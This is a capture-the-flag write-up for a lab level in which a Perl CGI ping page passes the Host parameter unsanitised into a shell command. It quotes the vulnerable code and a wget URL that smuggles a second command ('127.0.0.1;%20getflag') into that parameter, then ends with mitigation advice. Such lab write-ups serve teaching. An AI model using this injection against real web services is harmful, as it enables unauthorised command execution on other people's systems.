
---
### 🌐 Challenge Description

> The user `flag07` was experimenting with a basic **Perl web interface** that allowed pinging external hosts.  
> However, their lack of input validation has introduced a classic **command injection** vulnerability.

**Login:** `level07 : level07`  
**Target files:** `/home/flag07/index.cgi`, `/home/flag07/thttpd.conf`  
**Port in use:** `7007`

---

### 🧪 Source Code Review

```perl
sub ping {
  $host = $_[0];
  ...
  @output = `ping -c 3 $host 2>&1`;
  ...
}
```

⚠️ **Vulnerability Insight:**  
The user input `Host` is passed directly into a backtick-executed `ping` command **without any sanitization**.

This allows for **arbitrary command execution** using shell metacharacters like `;`.

---

### 🛠️ Exploitation Steps

#### 🔍 1. Discover the Web Server Port

The config file hints at the port:

```bash
cat /home/flag07/thttpd.conf | grep port
```

✅ Output:

```
port=7007
```

So the web server is running locally on port **7007**.

---

#### 🌐 2. Trigger Command Injection

Craft a malicious URL that appends a shell command to the `Host` parameter.

```bash
wget "http://127.0.0.1:7007/index.cgi?Host=127.0.0.1;%20getflag"
```

- `%20` = space
    
- `;` = command separator
    
- `getflag` = executed as `flag07`
    

This will run the `ping` as usual _and_ execute `getflag`.

---

#### 📄 3. Read the Output

Check the downloaded response:

```bash
cat index.cgi?Host=127.0.0.1;%20getflag
```

✅ Output (in HTML):

```
You have successfully executed getflag on a target account
```

---

### 🧠 Lessons Learned

This level is a real-world example of **unsanitized input in system calls** — especially dangerous in web apps.

🧱 **Command Injection Rule of Thumb:**

> Never directly inject user-controlled input into shell commands.  
> Use safe APIs, proper escaping, or whitelisting to eliminate risk.

---
